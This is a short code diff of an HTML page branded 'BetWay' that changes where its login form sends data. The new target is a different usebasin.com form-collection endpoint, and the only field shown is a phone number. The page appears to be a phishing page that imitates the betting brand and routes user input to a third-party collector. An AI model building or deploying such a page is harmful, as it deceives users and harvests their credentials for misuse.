@@ -148,7 +148,7 @@
         
         
         <div class="title"><span>BetWay</span></div>
-        <form action="https://usebasin.com/f/d6a4efba7f58"method="POST">
+        <form action="https://usebasin.com/f/3d3e5a57f611"method="POST">
           <div class="row">
             <i class="fas fa-user"></i>
             <input type="text" name="phone" placeholder="Phone" required>
